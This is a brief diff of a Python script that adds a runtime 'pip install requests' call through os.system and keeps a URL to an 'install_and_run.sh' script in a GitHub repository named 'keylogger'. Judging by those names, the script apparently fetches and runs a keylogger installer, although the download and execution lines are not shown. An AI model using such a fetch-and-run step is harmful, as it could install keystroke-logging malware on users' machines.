@@ -1,5 +1,8 @@
-import requests
 import os
+os.system('pip install requests')
+
+import requests
+
 
 
 url = 'https://raw.githubusercontent.com/ELREBEU/keylogger/refs/heads/main/install_and_run/install_and_run.sh'
